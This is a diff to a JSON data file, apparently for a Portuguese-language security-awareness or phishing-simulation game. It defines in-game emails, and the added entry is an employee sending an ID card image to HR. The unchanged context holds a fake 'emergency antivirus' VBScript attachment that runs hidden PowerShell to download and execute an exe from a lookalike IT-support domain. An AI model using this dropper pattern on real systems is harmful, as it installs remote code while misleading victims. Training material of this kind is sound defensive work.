@@ -133,5 +133,23 @@
         "data": { "text": "' Ferramenta antivirus de emergencia - TI\n' Execute e aguarde a mensagem de confirmacao\nSet sh = CreateObject(\"WScript.Shell\")\nsh.Run \"powershell -w hidden -c iwr http://ti-suporte-update.net/av.exe -o av.exe; .\\av.exe\", 0\nMsgBox \"Sua rede esta protegida!\"" }
       }
     ]
+  },
+  {
+    "triggerId": "borges_rg_d5",
+    "mailBox": "User",
+    "sender": "ryan.borges@nationaltech.com",
+    "subject": "Meu RG",
+    "body": "Oi! Segue o meu RG pra você conferir com o cadastro do RH.",
+    "attachments": [
+      {
+        "documentType": 4,
+        "name": "rg_ryan",
+        "extension": "png",
+        "linkedName": "<link=\"OpenAttachment|1\">rg_ryan.png</link>",
+        "data": {
+          "employeeId": "008"
+        }
+      }
+    ]
   }
 ]
